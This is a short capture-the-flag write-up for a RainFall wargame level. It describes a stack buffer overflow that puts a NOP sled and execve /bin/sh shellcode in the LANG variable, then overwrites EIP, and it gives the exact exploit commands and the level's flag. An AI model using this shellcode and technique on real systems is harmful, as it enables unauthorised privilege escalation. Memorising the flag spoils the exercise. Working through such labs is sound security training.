# Bonus 2

Here we have a program that takes 2 arguments but there is not enough space in the first argument to overflow in EIP and setup a shellcode. However we use an environnement variable in which we can store anything so we put our shellcode in there. Then we have to put enough characters in  argv[1] to overflow in argv2 making a big string to have enough characters to overflow in EIP. But if we keep the language anything else than nl we do not have enough characters to overflow in EIP so we need to start the LANG env variable with "nl" (fi should work too). Then we overflow in EIP giving it the address of our shellcode in the ENV (or any address part of the NOP slope preceding it to make easier address)
```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print "nl" + "\x90" * 128 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"')
bonus2@RainFall:~$ ./bonus2 NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN $(python -c 'print "N" * 23 + "\xd8\xfe\xff\xbf"')
```
**Flag:** `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
